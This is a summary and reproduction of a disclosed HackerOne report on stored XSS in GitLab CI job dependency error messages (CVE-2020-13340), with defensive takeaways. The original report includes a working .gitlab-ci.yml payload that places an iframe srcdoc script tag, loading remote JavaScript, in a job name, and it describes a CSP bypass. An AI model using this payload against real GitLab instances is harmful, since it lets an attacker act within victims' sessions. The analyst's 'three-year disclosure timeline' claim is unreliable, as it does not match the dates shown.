# Stored XSS in Build Dependencies Error Message

## Metadata
- **Source:** HackerOne
- **Report:** 950190 | https://hackerone.com/reports/950190
- **Submitted:** 2020-08-03
- **Reporter:** yvvdwf
- **Program:** GitLab
- **Bounty:** Not specified in report
- **Severity:** high
- **Vuln:** Stored Cross-Site Scripting (XSS), Improper Output Encoding, Unsafe HTML Rendering
- **CVEs:** CVE-2020-13340
- **Category:** web-api

## Summary
A stored XSS vulnerability exists in GitLab CI/CD build job error messages when displaying dependency validation failures. Malicious XSS payloads injected through job names in the .gitlab-ci.yml dependencies field are stored and executed when viewing job details, bypassing CSP protections through iframe usage. The vulnerability affects self-managed GitLab installations where dependency validation is enabled by default.

## Attack scenario
1. Attacker creates a project with access to CI/CD pipeline configuration
2. Attacker crafts .gitlab-ci.yml with malicious XSS payload in job name containing iframe tag with external script source
3. Attacker references the malicious job name in dependencies field of another job to trigger validation error
4. Error message containing unsanitized job name is stored in database as failure_message
5. Victim views the dependent job details page, triggering execution of stored XSS payload
6. Attacker's arbitrary JavaScript executes in victim's browser context with full session privileges

## Root cause
The `failure_message` field in BuildDetailsEntity serializer was marked as safe HTML without proper sanitization. Dependency validation error messages directly incorporated unsanitized job names that could contain XSS payloads, and the error message was rendered as trusted HTML in job detail views.

## Attacker mindset
An attacker with project access seeks to execute arbitrary JavaScript in the context of other users viewing CI/CD job details. By leveraging iframe-based payloads, the attacker can bypass Content Security Policy protections present on gitlab.com, making the attack effective across both self-managed and potentially SaaS instances through cross-site iframe inclusion.

## Defensive takeaways
- Always sanitize user-controlled input before rendering as HTML, even in error messages and system-generated content
- Never mark dynamic content as 'safe' without explicit security review and sanitization
- Implement output encoding for all values incorporated into HTML context, including job names and configuration references
- Apply consistent sanitization rules across all serializers and API responses that return user-controllable data
- Use allowlist-based HTML sanitization libraries rather than relying on context-specific escaping
- Review all places where user input can influence error messages for similar XSS vectors
- Test CSP effectiveness by considering iframe-based payload delivery methods
- Implement server-side validation of YAML configuration to reject suspicious patterns in job identifiers

## Variant hunting
Search for other serializers and views that mark failure_message, error_message, or log output as safe
Audit all CI/CD related error message generation for similar unsafe HTML marking
Check artifact download paths and build artifact references for similar XSS in error handling
Examine pipeline YAML parsing error messages for injection vulnerabilities
Review other configuration validation feedback mechanisms that might echo user input
Test stage names, script parameters, and other job configuration fields for similar injection points
Investigate whether other GitLab features with dependency/reference systems have equivalent vulnerabilities

## MITRE ATT&CK
- T1190
- T1598
- T1204

## Notes
The vulnerability specifically exploits the iframe+srcdoc pattern to bypass CSP, a technique detailed in related GitLab issue #831962. While gitlab.com mitigates this by disabling dependency validation, self-managed installations remain vulnerable. The attack requires project access to modify .gitlab-ci.yml but can affect any user viewing job details. The three-year disclosure timeline (report date 2020) suggests the issue may have been publicly exploitable for an extended period on unpatched self-managed instances.

## Full report
<details><summary>Expand</summary>

Hi,

A stored-XSS is existing in error message of build-dependencies. Fortunately it currently does not exist in gitlab.com. It seems that gitlab.com [disables](https://gitlab.com/gitlab-org/gitlab/-/issues/6144#note_232311971) the dependencies validation. However this feature is enable by default in self-managed installation.

### Steps to reproduce

The following steps should to be reproduced in a self-managed installation of gitlab

1. Create an empty project
2. Go to "Settings/CI/CD/Runners" to setup a runner for this project
3. Create new file `.gitlab-ci.yml` for this project using the following content:

```yaml
test<iframe srcdoc='<script src=https://gitlab.com/yvvdwf/data/-/jobs/552156057/artifacts/raw/alert.js></script>'></iframe>:
  stage: build
  script: 
    - date > index.html
  artifacts:
    paths: 
      - index.html
    expire_in: 1 second

job-test:
  stage: test
  script: echo "hi"
  dependencies: ["test<iframe srcdoc='<script src=https://gitlab.com/yvvdwf/data/-/jobs/552156057/artifacts/raw/alert.js></script>'></iframe>"]
```

4. Wait for the jobs terminated, go to the detail of `job-test`
5. You should see an alert that contains the current url

### Impact

Stored-XSS allow attackers to perform arbitrary actions on behalf of victims at client side. 
Furthermore, by using `<iframe>`  (detailed in #831962), the Stored-XSS can be fired in gitlab.com despite its CSP.

### What is the current *bug* behavior?

The `failure_message` has been considered as [safe](https://gitlab.com/gitlab-org/gitlab/-/blob/2a5ebef661656937f823736f4f84400a8979b576/app/serializers/build_details_entity.rb#L135)

### What is the expected *correct* behavior?

The `failure_message` should be sanitized.

### Relevant logs and/or screenshots

Please see a screenshot in attached file

### Output of checks

#### Results of GitLab environment info

(For installations with omnibus-gitlab package run and paste the output of:
`sudo gitlab-rake gitlab:env:info`)

```
System information
System:		Ubuntu 18.04
Proxy:		no
Current User:	git
Using RVM:	no
Ruby Version:	2.6.6p146
Gem Version:	2.7.10
Bundler Version:1.17.3
Rake Version:	12.3.3
Redis Version:	5.0.9
Git Version:	2.27.0
Sidekiq Version:5.2.9
Go Version:	unknown

GitLab information
Version:	13.2.2-ee
Revision:	618883a1f9d
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	11.7
URL:		http://gl.local
HTTP Clone URL:	http://gl.local/some-group/some-project.git
SSH Clone URL:	git@gl.local:some-group/some-project.git
Elasticsearch:	no
Geo:		no
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers: 

GitLab Shell
Version:	13.3.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git
```

## Impact

Stored-XSS allow attackers to perform arbitrary actions on behalf of victims at client side. 
Furthermore, by using `<iframe>`  (detailed in #831962), the Stored-XSS can be fired in gitlab.com despite its CSP.

</details>

---
*Analysed by Claude on 2026-05-12*
